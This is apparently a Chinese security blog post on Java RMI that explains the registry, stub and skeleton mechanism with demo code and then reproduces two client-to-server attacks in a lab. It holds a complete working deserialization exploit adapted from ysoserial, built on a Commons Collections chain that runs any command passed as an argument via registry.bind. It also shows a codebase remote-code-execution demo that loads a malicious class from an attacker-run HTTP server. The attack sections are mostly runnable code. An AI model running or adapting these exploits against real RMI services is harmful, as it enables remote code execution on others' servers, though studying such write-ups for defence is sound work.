@@ -1,0 +1,859 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>JavaSec-RMI | 6right</title>
+
+<link rel="shortcut icon" href="https://liangyueliangyue.github.io/favicon.ico?v=1686021349967">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://liangyueliangyue.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            6right
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/friends" class="menu gt-a-link">
+                    友链
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1686021349967"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    JavaSec-RMI
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-03-22 ·
+                    </time>
+                    
+                        <a href="https://liangyueliangyue.github.io/tag/_1xjK2YDa/" class="post-tags">
+                            # Java安全
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="rmi">RMI</h1>
+<p><code>RMI(Remote Method Invocation)</code>即<code>Java</code>远程方法调用，<code>RMI</code>用于构建分布式应用程序，<code>RMI</code>实现了<code>Java</code>程序之间跨<code>JVM</code>的远程通信。让某个Java虚拟机上的对象调⽤另⼀个Java虚拟机中对象上的⽅法。</p>
+<p><strong>RMI结构</strong></p>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/img_convert/2a73cacd97b0dda53d33a539a9eea54b.png" alt="image-20220321134350254" loading="lazy"></figure>
+<p><code>RMI</code>底层通讯采用了<code>Stub(运行在客户端)</code>和<code>Skeleton(运行在服务端)</code>机制，<code>RMI</code>调用远程方法的大致如下：</p>
+<ol>
+<li><code>RMI客户端</code>在调用远程方法时会先创建<code>Stub(sun.rmi.registry.RegistryImpl_Stub)</code>。</li>
+<li><code>Stub</code>会将<code>Remote</code>对象传递给<code>远程引用层(java.rmi.server.RemoteRef)</code>并创建<code>java.rmi.server.RemoteCall(远程调用)</code>对象。</li>
+<li><code>RemoteCall</code>序列化<code>RMI服务名称</code>、<code>Remote</code>对象。</li>
+<li><code>RMI客户端</code>的<code>远程引用层</code>传输<code>RemoteCall</code>序列化后的请求信息通过<code>Socket</code>连接的方式传输到<code>RMI服务端</code>的<code>远程引用层</code>。</li>
+<li><code>RMI服务端</code>的<code>远程引用层(sun.rmi.server.UnicastServerRef)</code>收到请求会请求传递给<code>Skeleton(sun.rmi.registry.RegistryImpl_Skel#dispatch)</code>。</li>
+<li><code>Skeleton</code>调用<code>RemoteCall</code>反序列化<code>RMI客户端</code>传过来的序列化。</li>
+<li><code>Skeleton</code>处理客户端请求：<code>bind</code>、<code>list</code>、<code>lookup</code>、<code>rebind</code>、<code>unbind</code>，如果是<code>lookup</code>则查找<code>RMI服务名</code>绑定的接口对象，序列化该对象并通过<code>RemoteCall</code>传输到客户端。</li>
+<li><code>RMI客户端</code>反序列化服务端结果，获取远程对象的引用。</li>
+<li><code>RMI客户端</code>调用远程方法，<code>RMI服务端</code>反射调用<code>RMI服务实现类</code>的对应方法并序列化执行结果返回给客户端。</li>
+<li><code>RMI客户端</code>反序列化<code>RMI</code>远程方法调用结果。</li>
+</ol>
+<h2 id="rmi远程方法调用demo">RMI远程方法调用Demo</h2>
+<p>第一步我们需要先启动<code>RMI服务端</code>，并注册服务。</p>
+<p>⼀个RMI Server分为三部分：</p>
+<ol>
+<li>⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数</li>
+<li>⼀个实现了此接⼝的类</li>
+<li>⼀个主类，⽤来创建Registry，并将上⾯的类实例化后绑定到⼀个地址。这就是我们所谓的Server 了。</li>
+</ol>
+<p>先实现一个继承了 java.rmi.Remote 的接⼝,定要test函数</p>
+<pre><code class="language-java">package com.sec.rmi;
+
+import java.rmi.Remote;
+import java.rmi.RemoteException;
+
+/**
+ * RMI测试接口
+ */
+public interface RMIInterfaceDemo extends Remote {
+
+    /**
+     * RMI测试方法
+     *
+     * @return 返回测试字符串
+     */
+    String test() throws RemoteException;
+
+}
+</code></pre>
+<p>在实现⼀个实现了此接⼝的类 ,并重写了test函数</p>
+<pre><code class="language-java">package com.sec.rmi;
+
+import java.rmi.RemoteException;
+import java.rmi.server.UnicastRemoteObject;
+
+public class RMIImplDemo extends UnicastRemoteObject implements RMIInterfaceDemo {
+
+    private static final long serialVersionUID = 1L;
+
+    protected RMIImplDemo() throws RemoteException {
+        super();
+    }
+
+    /**
+     * RMI测试方法
+     *
+     * @return 返回测试字符串
+     */
+    @Override
+    public String test() throws RemoteException {
+        return &quot;Hello 6right~&quot;;
+    }
+
+}
+</code></pre>
+<p>最后是<strong>RMI服务端注册服务代码：</strong></p>
+<p>Java RMI 设计了一个 Registry 的思想，很好理解，我们可以使用注册表来查找一个远端对象的引用，更通俗的来讲，这个就是一个 RMI 电话本，我们想在某个人那里获取信息时（Remote Method Invocation），我们在电话本上（Registry）通过这个人的名称 （Name）来找到这个人的电话号码（Reference），并通过这个号码找到这个人（Remote Object）</p>
+<pre><code class="language-java">package com.sec.rmi;
+import java.rmi.Naming;
+import java.rmi.registry.LocateRegistry;
+
+
+public class RMIServerDemo {
+    // RMI服务器IP地址
+    public static final String RMI_HOST = &quot;127.0.0.1&quot;;
+    // RMI服务端口
+    public static final int RMI_PORT = 9527;
+    public static final String RMI_NAME = &quot;rmi://&quot; + RMI_HOST + &quot;:&quot; + RMI_PORT + &quot;/test&quot;;
+
+
+    public static void main(String[] args) throws Exception {
+        //新建一个RMI Registry的时候，直接绑定RMIImplDemo对象在上面
+        LocateRegistry.createRegistry(RMI_PORT);
+        //Naming.bind 的第一个参数是一个URL，形如： rmi://host:port/name 。其中，host和port就是RMI Registry的地址和端口，name是远程对象的名字。如果RMI Registry在本地运行，那么host和port是可以省略的，此时host默认是 localhost ，port默认
+是 1099 ：
+        Naming.bind(RMI_NAME, new RMIImplDemo());
+        System.out.println(&quot;RMI服务启动成功,服务地址:&quot; + RMI_NAME);
+    }
+}
+</code></pre>
+<p>程序运行结果：</p>
+<pre><code>RMI服务启动成功,服务地址:rmi://127.0.0.1:9527/test
+</code></pre>
+<p><code>Naming.bind(RMI_NAME, new RMITestImpl())</code>绑定的是服务端的一个类实例，<code>RMI客户端</code>需要有这个实例的接口代码(<code>RMITestInterface.java</code>)，<code>RMI客户端</code>调用服务器端的<code>RMI服务</code>时会返回这个服务所绑定的对象引用，<code>RMI客户端</code>可以通过该引用对象调用远程的服务实现类的方法并获取方法执行结果。</p>
+<p><strong>RMI客户端示例代码：</strong></p>
+<pre><code class="language-java">package com.sec.rmi;
+
+import java.rmi.Naming;
+
+import static com.sec.rmi.RMIServerDemo.RMI_NAME;
+
+public class RMIClientDemo {
+
+    public static void main(String[] args) {
+        try {
+            // 查找远程RMI服务
+            RMIInterfaceDemo rt = (RMIInterfaceDemo) Naming.lookup(RMI_NAME);
+            // 调用远程接口RMITestInterface类的test方法
+            String result = rt.test();
+            // 输出RMI方法调用结果
+            System.out.println(result);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<p>客户端就简单多了，使⽤ Naming.lookup 在Registry中寻找到名字是Hello的对象，后⾯的使⽤就和在 本地使⽤⼀样了。</p>
+<p>虽说执⾏远程⽅法的时候代码是在远程服务器上执⾏的，但实际上我们还是需要知道有哪些⽅法，这时 候接⼝的重要性就体现了，这也是为什么我们前⾯要继承 Remote 并将我们需要调⽤的⽅法写在接⼝ RMIInterfaceDemo⾥，因为客户端也需要⽤到这个接⼝。</p>
+<p>程序运行结果：</p>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/img_convert/f0e5a073e01e8a1307319db39da44a4f.png" alt="image-20220321142134618" loading="lazy"></figure>
+<p>上面的Demo是在本地下实现的，现在在两台主机上进行C/S的流程</p>
+<p>服务端还是刚刚的本地服务端，客户端改部署在kali上</p>
+<p>kali-ip：192.168.159.132</p>
+<p>本机ip：192.168.159.1</p>
+<p>kali上RMIClientDemo.java</p>
+<pre><code class="language-java">package com.sec.rmi;
+
+import java.rmi.Naming;
+
+
+public class RMIClientDemo {
+    public static final String RMI_HOST = &quot;192.168.159.1&quot;;
+    public static final int RMI_PORT = 9527;
+    public static final String RMI_NAME = &quot;rmi://&quot; + RMI_HOST + &quot;:&quot; + RMI_PORT + &quot;/test&quot;;
+    public static void main(String[] args) {
+        try {
+            // 查找远程RMI服务
+            RMIInterfaceDemo rt = (RMIInterfaceDemo) Naming.lookup(RMI_NAME);
+            // 调用远程接口RMITestInterface类的test方法
+            String result = rt.test();
+            // 输出RMI方法调用结果
+            System.out.println(result);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+</code></pre>
+<p>还需要实现接口RMIInterfaceDemo.java</p>
+<pre><code class="language-java">package com.sec.rmi;
+
+import java.rmi.Remote;
+import java.rmi.RemoteException;
+
+/**
+ * RMI测试接口
+ */
+public interface RMIInterfaceDemo extends Remote {
+
+    /**
+     * RMI测试方法
+     *
+     * @return 返回测试字符串
+     */
+    String test() throws RemoteException;
+}
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/img_convert/e6d919f8be65745f889955553265d558.png" alt="image-20220321153429032" loading="lazy"></figure>
+<p>tips：</p>
+<ul>
+<li>服务端的包名就是最开始的<code>package com.sec.rmi;</code>，客户端包名也要一样不然会报错</li>
+</ul>
+<p>RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name 到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server；最后，远程⽅法实际上在RMI Server上调⽤。</p>
+<h2 id="rmi客户端攻击服务端">RMI客户端攻击服务端</h2>
+<p>RMI攻击围绕着三个主体</p>
+<ul>
+<li>Server端</li>
+<li>Client端</li>
+<li>Registry端</li>
+</ul>
+<p>最常见的就是在Client端攻击Server端，所以接下来的分析都是如此</p>
+<h3 id="rmi反序列化漏洞">RMI反序列化漏洞</h3>
+<p><code>RMI</code>通信中所有的对象都是通过Java序列化传输的，只要有Java对象反序列化操作就有可能有漏洞。</p>
+<p>既然<code>RMI</code>使用了反序列化机制来传输<code>Remote</code>对象，那么可以通过构建一个恶意的<code>Remote</code>对象，这个对象经过序列化后传输到服务器端，服务器端在反序列化时候就会触发反序列化漏洞。</p>
+<p>首先我们依旧使用上述<code>com.sec.rmi.RMIServerDemo</code>的代码，创建一个<code>RMI</code>服务，然后我们来构建一个恶意的<code>Remote</code>对象并通过<code>bind</code>请求发送给服务端。</p>
+<p><strong>RMI客户端反序列化攻击示例代码：</strong></p>
+<p>tips:</p>
+<ul>
+<li>这里使用的是CC链，jdk版本下调至1.7才可以复现RCE</li>
+</ul>
+<pre><code class="language-java">package com.sec.rmi;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.net.ssl.SSLContext;
+import javax.net.ssl.SSLSocketFactory;
+import javax.net.ssl.TrustManager;
+import javax.net.ssl.X509TrustManager;
+import java.io.IOException;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.net.Socket;
+import java.rmi.ConnectIOException;
+import java.rmi.Remote;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+import java.rmi.server.RMIClientSocketFactory;
+import java.security.cert.X509Certificate;
+import java.util.HashMap;
+import java.util.Map;
+
+import static com.sec.rmi.RMIServerDemo.RMI_HOST;
+import static com.sec.rmi.RMIServerDemo.RMI_PORT;
+
+/**
+ * RMI反序列化漏洞利用，修改自ysoserial的RMIRegistryExploit：https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/RMIRegistryExploit.java
+ *
+ * @author yz
+ */
+public class RMIExploit {
+
+    // 定义AnnotationInvocationHandler类常量
+    public static final String ANN_INV_HANDLER_CLASS = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;;
+
+    /**
+     * 信任SSL证书
+     */
+    private static class TrustAllSSL implements X509TrustManager {
+
+        private static final X509Certificate[] ANY_CA = {};
+
+        public X509Certificate[] getAcceptedIssuers() {
+            return ANY_CA;
+        }
+
+        public void checkServerTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
+
+        public void checkClientTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
+
+    }
+
+    /**
+     * 创建支持SSL的RMI客户端
+     */
+    private static class RMISSLClientSocketFactory implements RMIClientSocketFactory {
+
+        public Socket createSocket(String host, int port) throws IOException {
+            try {
+                // 获取SSLContext对象
+                SSLContext ctx = SSLContext.getInstance(&quot;TLS&quot;);
+
+                // 默认信任服务器端SSL
+                ctx.init(null, new TrustManager[]{new TrustAllSSL()}, null);
+
+                // 获取SSL Socket连接工厂
+                SSLSocketFactory factory = ctx.getSocketFactory();
+
+                // 创建SSL连接
+                return factory.createSocket(host, port);
+            } catch (Exception e) {
+                throw new IOException(e);
+            }
+        }
+    }
+
+    /**
+     * 使用动态代理生成基于InvokerTransformer/LazyMap的Payload
+     *
+     * @param command 定义需要执行的CMD
+     * @return Payload
+     * @throws Exception 生成Payload异常
+     */
+    private static InvocationHandler genPayload(String command) throws Exception {
+        // 创建Runtime.getRuntime.exec(cmd)调用链
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{
+                        String.class, Class[].class}, new Object[]{
+                        &quot;getRuntime&quot;, new Class[0]}
+                ),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]{
+                        Object.class, Object[].class}, new Object[]{
+                        null, new Object[0]}
+                ),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{command})
+        };
+
+        // 创建ChainedTransformer调用链对象
+        Transformer transformerChain = new ChainedTransformer(transformers);
+
+        // 使用LazyMap创建一个含有恶意调用链的Transformer类的Map对象
+        final Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);
+
+        // 获取AnnotationInvocationHandler类对象
+        Class clazz = Class.forName(ANN_INV_HANDLER_CLASS);
+
+        // 获取AnnotationInvocationHandler类的构造方法
+        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+
+        // 设置构造方法的访问权限
+        constructor.setAccessible(true);
+
+        // 实例化AnnotationInvocationHandler，
+        // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, lazyMap);
+        InvocationHandler annHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
+
+        // 使用动态代理创建出Map类型的Payload
+        final Map mapProxy2 = (Map) Proxy.newProxyInstance(
+                ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, annHandler
+        );
+
+        // 实例化AnnotationInvocationHandler，
+        // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, mapProxy2);
+        return (InvocationHandler) constructor.newInstance(Override.class, mapProxy2);
+    }
+
+    /**
+     * 执行Payload
+     *
+     * @param registry RMI Registry
+     * @param command  需要执行的命令
+     * @throws Exception Payload执行异常
+     */
+    public static void exploit(final Registry registry, final String command) throws Exception {
+        // 生成Payload动态代理对象
+        Object payload = genPayload(command);
+        String name    = &quot;test&quot; + System.nanoTime();
+
+        // 创建一个含有Payload的恶意map
+        Map&lt;String, Object&gt; map = new HashMap();
+        map.put(name, payload);
+
+        // 获取AnnotationInvocationHandler类对象
+        Class clazz = Class.forName(ANN_INV_HANDLER_CLASS);
+
+        // 获取AnnotationInvocationHandler类的构造方法
+        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+
+        // 设置构造方法的访问权限
+        constructor.setAccessible(true);
+
+        // 实例化AnnotationInvocationHandler，
+        // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, map);
+        InvocationHandler annHandler = (InvocationHandler) constructor.newInstance(Override.class, map);
+
+        // 使用动态代理创建出Remote类型的Payload
+        Remote remote = (Remote) Proxy.newProxyInstance(
+                ClassLoader.getSystemClassLoader(), new Class[]{Remote.class}, annHandler
+        );
+
+        try {
+            // 发送Payload
+            registry.bind(name, remote);
+        } catch (Throwable e) {
+            e.printStackTrace();
+        }
+    }
+
+    public static void main(String[] args) throws Exception {
+        if (args.length == 0) {
+            // 如果不指定连接参数默认连接本地RMI服务
+            args = new String[]{RMI_HOST, String.valueOf(RMI_PORT), &quot;calc&quot;};
+        }
+
+        // 远程RMI服务IP
+        final String host = args[0];
+
+        // 远程RMI服务端口
+        final int port = Integer.parseInt(args[1]);
+
+        // 需要执行的系统命令
+        final String command = args[2];
+
+        // 获取远程Registry对象的引用
+        Registry registry = LocateRegistry.getRegistry(host, port);
+
+        try {
+            // 获取RMI服务注册列表(主要是为了测试RMI连接是否正常)
+            String[] regs = registry.list();
+
+            for (String reg : regs) {
+                System.out.println(&quot;RMI:&quot; + reg);
+            }
+        } catch (ConnectIOException ex) {
+            // 如果连接异常尝试使用SSL建立SSL连接,忽略证书信任错误，默认信任SSL证书
+            registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory());
+        }
+
+        // 执行payload
+        exploit(registry, command);
+    }
+
+}
+</code></pre>
+<p>程序执行后将会在<code>RMI服务端</code>弹出计算器，<code>RMIExploit</code>程序执行的流程大致如下：</p>
+<ol>
+<li>使用<code>LocateRegistry.getRegistry(host, port)</code>创建一个<code>RemoteStub</code>对象。</li>
+<li>构建一个适用于<code>Apache Commons Collections</code>的恶意反序列化对象(使用的是<code>LazyMap</code>+<code>AnnotationInvocationHandler</code>组合方式)。</li>
+<li>使用<code>RemoteStub</code>调用<code>RMI服务端</code>的<code>bind</code>指令，并传入一个使用动态代理创建出来的<code>Remote</code>类型的恶意<code>AnnotationInvocationHandler</code>对象到<code>RMI服务端</code>。</li>
+<li><code>RMI服务端</code>接受到<code>bind</code>请求后会反序列化我们构建的恶意<code>Remote对象</code>从而触发<code>Commons Collections</code>漏洞的<code>RCE</code>。</li>
+</ol>
+<h3 id="codebase远程代码执行">codebase远程代码执行</h3>
+<h4 id="codebase">Codebase</h4>
+<p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类,而CLASSPATH是“本地codebase”，它是磁盘上加载本地类的位置。</p>
+<ul>
+<li>
+<p>codebase通常是远程URL，比如http、ftp等。</p>
+</li>
+<li>
+<p>例如指定 codebase=http://example.com/ ，然后加载 com.sec.Codebase.Example 类，则 Java虚拟机会下载这个文件 http://example.com/com.sec.Codebase.Example，并作为 Example类的字节码。</p>
+</li>
+</ul>
+<p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在 本地没有找到这个类，就会去远程加载codebase中的类。</p>
+<ul>
+<li>例如RMIClientDemo.java 编译之后会生成RMIClientDemo.class 和 RMIClientDemo$Right6.class，我们的服务端会访问这两个文件</li>
+</ul>
+<p>在RMI中，我们是可以将codebase随着序列化数据一起传输的，服务器在接收到这个数据后在 CLASSPATH没有找到，就会去指定的codebase寻找类，往RMIClient.java中添加恶意命令执行的代码，由于codebase被控制导致任意命令执行漏洞。</p>
+<p>只有满足如下条件的RMI服务器才能被攻击：</p>
+<ul>
+<li>
+<p>需要SecurityManager</p>
+<ul>
+<li>因为我们通过网络加载外部类并执行方法，所以我们必须要有一个安全管理器来进行管理，如果没有设置安全管理，则 RMI 不会动态加载任何类</li>
+</ul>
+</li>
+<li>
+<p>Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false</p>
+<ul>
+<li>官方在Java 7u21、6u45的时候将 java.rmi.server.useCodebaseOnly 的默认值由 false 改为了 true 。</li>
+<li>在 java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java虚拟机将只信任预先配置好的 codebase ，不再支持从RMI请求中获取。</li>
+</ul>
+</li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://img-blog.csdnimg.cn/img_convert/4c3586150244b784e5f2bea5c44b821a.png" alt="image-20220321195352922" loading="lazy"></figure>
+<h4 id="复现demo">复现Demo</h4>
+<p>我们来编写一个简单的RMIServer用于复现这个漏洞。</p>
+<p>注意jdk环境要低于7u21、6u45，这里我使用JDK 1.7.0_17</p>
+<h5 id="客户端">客户端</h5>
+<ul>
+<li>kali：192.168.159.132</li>
+<li>RMIClientDemo.java</li>
+</ul>
+<pre><code class="language-java">package com.sec.rmi;
+
+import java.io.Serializable;
+import java.rmi.Naming;
+import java.util.ArrayList;
+import java.util.List;
+
+public class RMIClientDemo implements Serializable {
+    public static final String RMI_HOST = &quot;192.168.159.1&quot;;
+    public static final int RMI_PORT = 9527;
+    public static final String RMI_NAME = &quot;rmi://&quot; + RMI_HOST + &quot;:&quot; + RMI_PORT + &quot;/test&quot;;
+    public class Right6 extends ArrayList&lt;Integer&gt; {}
+    public void lookup() throws Exception {
+	    List&lt;Integer&gt; li = new Right6();
+   		RMIInterfaceDemo rt = (RMIInterfaceDemo) Naming.lookup(RMI_NAME);
+        String result = rt.test(li);//远程调用触发点，在这里触发从cosebase中读取class文件执行！！
+        System.out.println(result);
+    }
+    public static void main(String[] args) {
+        try {
+            new RMIClientDemo().lookup();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+</code></pre>
+<p>本地只有一个抽象接口，所以Right6具体是从cosebase获取的class文件</p>
+<ul>
+<li>RMIInterfaceDemo.java</li>
+</ul>
+<pre><code class="language-java">package com.sec.rmi;
+
+import java.rmi.Remote;
+import java.rmi.RemoteException;
+import java.util.List;
+
+/**
+ * RMI测试接口
+ */
+public interface RMIInterfaceDemo extends Remote {
+
+    /**
+     * RMI测试方法
+     *
+     * @return 返回测试字符串
+     */
+    String test(List&lt;Integer&gt; params) throws RemoteException;
+
+}
+</code></pre>
+<h5 id="服务端">服务端</h5>
+<ul>
+<li>windows：192.168.159.1</li>
+<li>RMIImplDemo.java</li>
+</ul>
+<pre><code class="language-java">package com.sec.rmi;
+
+import java.util.List;
+import java.rmi.RemoteException;
+import java.rmi.server.UnicastRemoteObject;
+
+public class RMIImplDemo extends UnicastRemoteObject implements RMIInterfaceDemo {
+
+    private static final long serialVersionUID = 1L;
+
+    protected RMIImplDemo() throws RemoteException {
+        super();
+    }
+
+    /**
+     * RMI测试方法
+     *
+     * @return 返回测试字符串
+     */
+    @Override
+    public String test(List&lt;Integer&gt; params) throws RemoteException {
+        return &quot;Hello 6right~&quot;;
+    }
+
+}
+</code></pre>
+<ul>
+<li>RMlInterfaceDemo.java</li>
+</ul>
+<p>和客户端的一致</p>
+<ul>
+<li>RMIServerDemo.java</li>
+</ul>
+<pre><code class="language-java">package com.sec.rmi;
+import java.rmi.Naming;
+import java.rmi.registry.LocateRegistry;
+
+
+public class RMIServerDemo {
+    public static final String RMI_HOST = &quot;192.168.159.1&quot;;
+    public static final int RMI_PORT = 9527;
+    public static final String RMI_NAME = &quot;rmi://&quot; + RMI_HOST + &quot;:&quot; + RMI_PORT + &quot;/test&quot;;
+
+
+    public static void main(String[] args) throws Exception {
+        //设置安全策略
+        if (System.getSecurityManager() == null) {
+            System.out.println(&quot;setup SecurityManager&quot;);
+            System.setSecurityManager(new SecurityManager());
+        }
+        LocateRegistry.createRegistry(RMI_PORT);
+        Naming.bind(RMI_NAME, new RMIImplDemo());
+        System.out.println(&quot;RMI服务启动成功,服务地址:&quot; + RMI_NAME);
+    }
+}
+</code></pre>
+<ul>
+<li>1.policy
+<ul>
+<li>开放所有权限</li>
+</ul>
+</li>
+</ul>
+<pre><code>grant {
+    permission java.security.AllPermission;
+};
+</code></pre>
+<p>tips:policy文件放在工作目录下,服务端传参调用-Djava.security.policy=1.policy</p>
+<figure data-type="image" tabindex="5"><img src="https://img-blog.csdnimg.cn/img_convert/01752f3a2f81076a3cbbe8c3e3e8aca0.png" alt="image-20220322100820229" loading="lazy"></figure>
+<p>客户端调用</p>
+<pre><code>java  -Djava.rmi.server.codebase=http://x.x.x.x:x/ com.sec.rmi.RMIClientDemo
+</code></pre>
+<p>vps成功收到请求</p>
+<figure data-type="image" tabindex="6"><img src="https://img-blog.csdnimg.cn/img_convert/09848e3191f6f83b5aeca132c28bdf19.png" alt="image-20220322100925661" loading="lazy"></figure>
+<p>接下来直接利用，将RMIClientDemo加入恶意代码</p>
+<pre><code class="language-java">package com.sec.rmi;
+
+import java.io.Serializable;
+import java.rmi.Naming;
+import java.util.ArrayList;
+import java.util.List;
+
+public class RMIClientDemo implements Serializable {
+    private static final long serialVersionUID = 1L;
+    static {
+        try{
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+        } catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+    public static final String RMI_HOST = &quot;192.168.159.1&quot;;
+    public static final int RMI_PORT = 9527;
+    public static final String RMI_NAME = &quot;rmi://&quot; + RMI_HOST + &quot;:&quot; + RMI_PORT + &quot;/test&quot;;
+    public class Right6 extends ArrayList&lt;Integer&gt; {}
+    public void lookup() throws Exception {
+        List&lt;Integer&gt; li = new Right6();
+        RMIInterfaceDemo rt = (RMIInterfaceDemo) Naming.lookup(RMI_NAME);
+        String result = rt.test(li);//远程调用触发点，在这里触发从cosebase中读取class文件执行！！
+        System.out.println(result);
+    }
+    public static void main(String[] args) {
+        try {
+            new RMIClientDemo().lookup();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+</code></pre>
+<p>开启httpserver</p>
+<pre><code>python -m SimpleHTTPServer 8000 
+</code></pre>
+<p>客户端重新发起恶意请求，服务端成功执行</p>
+<figure data-type="image" tabindex="7"><img src="https://img-blog.csdnimg.cn/img_convert/d2441943e22d398967e5bc0cd013c595.png" alt="image-20220322104454301" loading="lazy"></figure>
+<h4 id="简单流程">简单流程</h4>
+<p>客户端在调用时，传递了一个可序列化对象，这个对象在服务端不存在，则在服务端会抛出 ClassNotFound 的异常，但是 RMI 支持动态类加载，如果设置了 <code>java.rmi.server.codebase</code>，则会尝试从其中的地址获取 <code>.class</code> 并加载及反序列化。当其中包含恶意代码片段时执行达到远程RCE</p>
+<h2 id="总结">总结</h2>
+<p>简单学习了 RMI的基础知识 ，通过Demo了解了RMI 的使用，分析了 RMI 实现的部分流程，针对 RMI 中Clinet端攻击Server端进行了Demo测试。</p>
+<p>其实剩下来的知识点还很多，后面写的话还会更一篇文章。</p>
+<ul>
+<li>JEP290学习及绕过</li>
+<li>RMI利用JRMP协议漏洞</li>
+<li>Server攻击Client端(反制)</li>
+<li>Registry端的攻击</li>
+</ul>
+<h2 id="参考">参考</h2>
+<ul>
